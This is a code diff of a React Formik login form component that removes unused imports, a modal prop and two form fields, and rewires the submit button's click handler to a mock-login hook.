@@ -1,17 +1,17 @@
 import { Field, Form, Formik } from "formik";
 import useMockLogin from "../hooks/useMockLogin";
 import { site } from "../config";
-import { useState } from "react";
-import { toast } from "react-toastify";
+// import { useState } from "react";
+// import { toast } from "react-toastify";
 
-function LoginForm({ setShowModal }) {
+function LoginForm() {
   const initialvalues = {
     email: "",
     password: "",
-    remember: "",
+    // remember: "",
   };
 
-  const { login } = useMockLogin({ setShowModal });
+  const { login } = useMockLogin();
 
   const handleSubmit = (values, formik) => {
     const { email, password } = values;
@@ -23,7 +23,7 @@ function LoginForm({ setShowModal }) {
       site: site,
       email: email,
       password: password,
-      skipcode: "",
+      // skipcode: "",
     };
 
     login(submitValues, formik);
@@ -73,7 +73,7 @@ function LoginForm({ setShowModal }) {
 
               <button
                 className="bg-[#58C2FC] text-white text-lg  flex items-center gap-10 lg:gap-5 px-5 py-[6px] rounded-md w-full"
-                onClick={() => handleSubmit()}
+                onClick={handleSubmit}
               >
                 <div className="relative w-10 h-10 rounded-md overflow-hidden">
                   <Image
